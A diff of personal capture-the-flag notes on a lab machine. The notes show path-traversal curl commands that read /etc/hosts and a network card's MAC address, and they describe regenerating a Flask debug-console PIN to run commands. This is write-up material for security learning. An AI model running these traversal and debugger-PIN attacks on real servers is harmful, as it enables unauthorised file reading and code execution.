@@ -63,7 +63,7 @@ whatweb http://<ip>
 curl http://10.10.11.164/uploads/..//etc/hosts --path-as-is --ignore-content-length
 ```
 # Docker Exploitation
-## Inicial Access
+## Inicial Access 1st Method
 
 - so we can exploit the function `os.path.join()` (because if we use `/` the left path of the command will be removed) 
 >[!info]- Like this:
@@ -102,10 +102,12 @@ export TERM=xterm-256color
 > [!example]- Result
 > ![[Pasted image 20250226163759.png]]
 
-# Docker Breakout
-- we are inside a docker so lets get out of here
->[!example]- Result
->![[Pasted image 20250226164003.png]]
+## Inicial Access 2nd Method
+- As we saw above we have a LFI so we have access to the data we need to generate a PIN code to get access to debug console, so get the MAC address:
+```bash
+curl http://10.10.11.164/uploads/..//sys/class/net/eth0/address --path-as-is --ignore-content-length
+python -c 'print(0x0242ac110007)'
+```
 
 - now we have all pieces to reproduce a PIN code to get access at debug console, first we need to get MAC address (In my case `2485377892359`)
 ```bash
@@ -232,3 +234,5 @@ os.popen('whoami').read().strip()
 >[!example]- Result
 >![[Pasted image 20250226185729.png]]
 
+
+# Docker Breakout
